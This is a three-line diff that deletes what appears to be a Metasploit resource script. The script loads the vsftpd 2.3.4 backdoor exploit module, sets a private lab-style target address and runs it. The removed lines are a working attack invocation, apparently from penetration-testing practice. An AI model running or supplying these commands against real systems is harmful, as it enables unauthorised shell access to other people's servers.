@@ -1,3 +1,0 @@
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 192.168.56.105
-run
